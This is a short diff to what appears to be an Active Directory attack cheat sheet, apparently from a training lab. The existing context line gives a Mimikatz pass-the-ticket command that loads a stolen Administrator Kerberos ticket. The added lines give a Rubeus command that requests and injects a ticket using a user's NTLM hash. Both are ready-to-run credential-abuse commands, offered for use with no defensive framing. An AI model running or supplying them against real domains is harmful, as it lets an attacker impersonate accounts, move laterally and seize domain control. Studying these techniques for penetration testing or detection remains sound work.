@@ -359,6 +359,8 @@ misc::skeleton
 #### Mimikatz Pass-the-ticket
 ```Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\userX\[0;6f5638a]-2-0-60a10000- Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'```
 
+#### Rubeus Pass-the-ticket
+```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
 
 * * *
